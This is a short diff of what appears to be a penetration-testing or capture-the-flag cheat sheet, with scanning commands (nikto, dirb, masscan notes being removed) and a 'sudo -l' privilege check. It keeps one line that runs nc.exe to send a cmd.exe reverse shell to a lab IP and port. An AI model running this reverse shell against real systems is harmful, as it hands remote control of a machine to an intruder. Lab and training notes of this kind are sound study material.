@@ -17,11 +17,6 @@ nikto -h <ip>
 dirb http://<host>
 -----------------------
 execute -f nc.exe -a "-e cmd.exe 10.10.14.28 1234"
---------------------------------------------------
-running a mass scan then a nmap seems like a better way to go
-masscan -p 1-65535 10.10.10.30 -e tun0 --rate=1000
-Essentially it becomes faster than an nmap scan for all ports
-then nmap these ports
 -------------------------------------------------
 sudo -l
 see what commands you can running
